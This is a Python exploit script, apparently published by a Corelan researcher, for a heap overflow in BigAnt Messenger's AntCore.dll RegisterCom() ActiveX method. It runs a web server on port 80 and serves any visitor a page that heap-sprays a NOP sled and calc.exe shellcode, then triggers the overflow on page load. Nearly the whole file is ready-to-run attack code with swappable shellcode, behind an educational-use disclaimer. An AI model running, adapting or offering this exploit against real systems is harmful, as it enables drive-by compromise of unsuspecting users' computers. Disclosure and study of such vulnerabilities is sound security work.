#!/usr/bin/python
# #########################################################################################
# Bigant Messenger <= v2.52 - (AntCore.dll) RegisterCom() Remote 0day Heap Overflow Exploit
# Found by: Steven Seeley - mr_me( AT )corelan.be - http://net-ninja.net/
# Homepage: http://www.bigantsoft.com/
# Download: http://www.bigantsoft.com/download.html
# Tested on: Windows XP SP3 (IE 6 & 7)
# Marked safe for scripting: No
# Advisory: http://www.corelan.be:8800/advisories.php?id=10-033
# Patch: http://www.bigantsoft.com/software/BigAnt255SP8.zip
# Greetz: Corelan Security Team
# http://www.corelan.be:8800/index.php/security/corelan-team-members/
# ########################################################################################
# Note: There are many other vulnerable controls in this dll such as ListBoard().
# ########################################################################################
# Script provided 'as is', without any warranty.
# Use for educational purposes only.
# Do not use this code to do anything illegal !
#
# Note : you are not allowed to edit/modify this code.
# If you do, Corelan cannot be held responsible for any damages this may cause.
# ########################################################################################
from BaseHTTPServer import HTTPServer 
from BaseHTTPServer import BaseHTTPRequestHandler 
import sys 

class myRequestHandler(BaseHTTPRequestHandler):
  def do_GET(self):
    self.printCustomHTTPResponse(200)
    if self.path == "/":
        target=self.client_address[0]
        self.wfile.write("""<html>
<object classid='clsid:25745F2B-2AC9-4551-948B-574C50D4EE59' id='boom' ></object>
<script language="JavaScript" defer>
  	//calc.exe
  var sCode = unescape("%uE860%u0000%u0000%u815D%u06ED%u0000%u8A00%u1285%u0001%u0800" +
                       "%u75C0%uFE0F%u1285%u0001%uE800%u001A%u0000%uC009%u1074%u0A6A" +
                       "%u858D%u0114%u0000%uFF50%u0695%u0001%u6100%uC031%uC489%uC350" +
                       "%u8D60%u02BD%u0001%u3100%uB0C0%u6430%u008B%u408B%u8B0C%u1C40" +
                       "%u008B%u408B%uFC08%uC689%u3F83%u7400%uFF0F%u5637%u33E8%u0000" +
                       "%u0900%u74C0%uAB2B%uECEB%uC783%u8304%u003F%u1774%uF889%u5040" +
                       "%u95FF%u0102%u0000%uC009%u1274%uC689%uB60F%u0107%uEBC7%u31CD" +
                       "%u40C0%u4489%u1C24%uC361%uC031%uF6EB%u8B60%u2444%u0324%u3C40" +
                       "%u408D%u8D18%u6040%u388B%uFF09%u5274%u7C03%u2424%u4F8B%u8B18" +
                       "%u205F%u5C03%u2424%u49FC%u407C%u348B%u038B%u2474%u3124%u99C0" +
                       "%u08AC%u74C0%uC107%u07C2%uC201%uF4EB%u543B%u2824%uE175%u578B" +
                       "%u0324%u2454%u0F24%u04B7%uC14A%u02E0%u578B%u031C%u2454%u8B24" +
                       "%u1004%u4403%u2424%u4489%u1C24%uC261%u0008%uC031%uF4EB%uFFC9" +
                       "%u10DF%u9231%uE8BF%u0000%u0000%u0000%u0000%u9000%u6163%u636C" +
                       "%u652E%u6578%u9000");
  var sSlide = unescape("%u9090%u9090");
  var heapSA = 0x0c0c0c0c;
  function tryMe()
   {
    var buffSize = 5140;
    var x =  unescape("%0a%0a%0a%0a");
    while (x.length<buffSize) x += x;
    x = x.substring(0,buffSize);
    boom.RegisterCom(x,1,1);
  }
  function getsSlide(sSlide, sSlideSize)
   {
    while (sSlide.length*2<sSlideSize)
     {
      sSlide += sSlide;
     }
    sSlide = sSlide.substring(0,sSlideSize/2);
    return (sSlide);
  }
  var heapBS = 0x400000;
  var sizeHDM = 0x5;
  var PLSize = (sCode.length * 2);
  var sSlideSize = heapBS - (PLSize + sizeHDM);
  var heapBlocks = (heapSA+heapBS)/heapBS;
  var memory = new Array();
  sSlide = getsSlide(sSlide,sSlideSize);
  for (i=0;i<heapBlocks;i++)
   {
    memory[i] = sSlide +  sCode;
   }
</script>
<body onload="JavaScript: return tryMe();">
<p><center>~ mr_me presents ~</p>
<p><b>Bigant Messenger <= v2.52 - (AntCore.dll) RegisterCom() Remote 0day Heap Overflow Exploit</b></center></p>
</body>
</html>""")
        print ("\n\n(+) Exploit sent to the target %s." % (target))

  def printCustomHTTPResponse(self, respcode):
    self.send_response(respcode)
    self.send_header("Content-type", "text/html")
    self.send_header("Server", "myRequestHandler")
    self.end_headers()

httpd = HTTPServer(('', 80), myRequestHandler)

print ("""
\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\tBigant Messenger <= v2.52 - (AntCore.dll) RegisterCom() Remote 0day Heap Overflow Exploit
\tFound by: Steven Seeley - mr_me( AT )corelan.be
\tTested on windows XP sp3 (IE 6/7)
\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
""")
print ("(+) Listening on port 80.")
print ("(+) Have someone connect to you.")
print ("\nType <ctrl>-c to exit..")
try:
     httpd.handle_request()
     httpd.serve_forever() 
except KeyboardInterrupt:
       print ("\n\n(-) Exiting Exploit.\n\n")
       sys.exit(1)